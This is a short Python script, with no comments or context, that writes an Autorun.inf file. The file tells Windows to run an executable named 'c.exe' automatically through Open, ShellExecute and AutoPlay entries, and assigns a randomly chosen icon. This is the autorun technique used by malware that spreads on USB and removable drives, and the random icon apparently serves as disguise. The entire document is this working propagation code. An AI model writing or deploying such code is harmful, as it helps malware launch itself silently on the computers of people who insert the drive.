import random as r
f=open("Autorun.inf",'w+')
a=r.randrange(1,9)
a=str(a)
a='image_'+a+'.ico'
f.write("[autorun]\nOpen=c.exe\nShellExecute=c.exe\nUseAutoPlay=1\n")
f.write("icon="+a)
f.close()
